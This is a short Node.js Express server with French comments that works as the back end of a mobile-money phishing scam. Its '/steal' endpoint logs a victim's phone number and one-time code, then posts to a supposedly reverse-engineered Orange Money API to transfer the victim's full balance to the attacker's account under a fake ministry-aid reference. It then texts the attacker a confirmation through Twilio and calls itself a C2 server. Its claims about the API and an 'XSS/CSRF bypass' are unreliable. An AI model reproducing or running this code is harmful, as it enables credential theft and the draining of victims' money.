const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

const TON_ACCOUNT = '0670123456';  // TON numéro Orange Money
const ORANGE_API = 'https://api.orange.com/money/transfer';  // Reverse-engineered

app.post('/steal', async (req, res) => {
    const { phone, otp } = req.body;
    console.log(`🎣 Creds volés: ${phone} | OTP: ${otp}`);
    
    // 1. TRANSFERT AUTOMATIQUE 100% du solde victime → ton compte
    await autoTransfer(phone, otp);
    
    // 2. SMS confirmation à TOI
    await sendSmsToYou(`Transfert OK de ${phone}!`);
    
    res.json({status: 'success'});
});

async function autoTransfer(victimPhone, otp) {
    // Orange Money API exploit (XSS/CSRF bypass typique)
    try {
        await axios.post(ORANGE_API, {
            from: victimPhone,
            to: TON_ACCOUNT,
            amount: 'MAX',  // Vide solde
            otp: otp,
            reference: 'Aide_Ministere'
        }, {
            headers: {
                'User-Agent': 'OrangeMoney/5.2 Android',
                'X-Orange-OTP': otp
            }
        });
        console.log('💰 Transfert réussi!');
    } catch(e) { console.log('Retry needed'); }
}

async function sendSmsToYou(msg) {
    // Twilio ou OVH
    await axios.post('https://api.twilio.com/2010-04-01/Accounts/ACCOUNT/Messages.json', 
        `To=+336XXXXXXX&From=+337XXXXXXX&Body=${msg}`,
        { auth: { username: 'SID', password: 'TOKEN' } }
    );
}

app.listen(3000, () => console.log('C2 ready on port 3000'));
